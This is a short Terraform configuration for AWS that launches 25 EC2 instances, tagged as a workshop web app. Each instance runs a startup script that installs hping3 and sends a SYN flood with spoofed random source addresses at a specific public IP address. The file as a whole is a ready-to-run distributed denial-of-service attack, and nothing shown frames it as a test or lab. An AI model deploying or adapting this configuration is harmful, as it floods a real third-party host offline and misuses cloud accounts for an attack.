provider "aws" {
  region = "us-east-1"
}


variable "userdataEC2" {
  type    = string
  default = <<-EOF
                #!/bin/bash
                apt update
                apt install -y hping3
                hping3 -c 20000 -d 120 -S -w 64 -p 80 --flood --rand-source 128.199.182.131 

EOF

}

//create EC2 Apps
resource "aws_instance" "ec2WorkshopWebApp" {
  //aws AMI selection -- Amazon Linux 2
  ami = "ami-07ebfd5b3428b6f4d"

  count = 25

  //aws EC2 instance type, t2.micro for free tier
  instance_type          = "t2.micro"
  key_name               = "sobi"
  subnet_id              = aws_subnet.workshopPublicSubnet.id
  vpc_security_group_ids = [aws_security_group.secGroupWorkshopWebSSH.id]

  //user_data_base64            = "${base64encode(var.userdataEC2)}"
  user_data            = var.userdataEC2
#   iam_instance_profile = aws_iam_instance_profile.instanceProfileWorkshop.name
  tags = {
    Name = "ec2WorkshopWebApp"
  }
}
